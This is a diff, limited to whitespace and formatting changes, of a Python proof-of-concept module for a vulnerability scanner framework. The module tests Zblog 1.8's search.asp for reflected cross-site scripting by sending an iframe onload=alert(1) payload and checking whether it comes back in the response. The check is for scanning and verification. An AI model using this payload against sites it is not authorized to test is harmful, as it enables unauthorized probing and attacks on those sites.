@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Zblog_0003'  # 平台漏洞编号，留空
     name = 'Zblog1.8 search.asp XSS'  # 漏洞名称
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     product = 'Zblog'  # 漏洞应用名称
     product_version = 'Zblog1.8'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '8d5b9e5a-871b-4395-8fef-8aadfb2f3ea0'
     author = '47bwy'  # POC编写者
@@ -33,9 +35,9 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             payload = '/search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E'
-            verify_url =  self.target + payload
+            verify_url = self.target + payload
             r = requests.get(verify_url)
-           
+
             if r.status_code == 200 and '<iframe src=@ onload=alert(1)>' in r.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
